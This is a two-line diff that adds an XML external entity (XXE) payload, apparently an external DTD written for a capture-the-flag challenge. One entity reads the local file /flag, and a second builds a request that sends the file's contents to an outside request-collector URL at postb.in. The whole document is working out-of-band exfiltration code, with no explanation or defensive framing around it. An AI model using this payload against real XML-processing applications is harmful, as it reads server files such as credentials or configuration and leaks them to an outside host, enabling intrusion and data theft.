@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "file:///flag">
+<!ENTITY % final "<!ENTITY exfil SYSTEM 'https://www.postb.in/1766955244589-0557441164273?d=%data;'>">
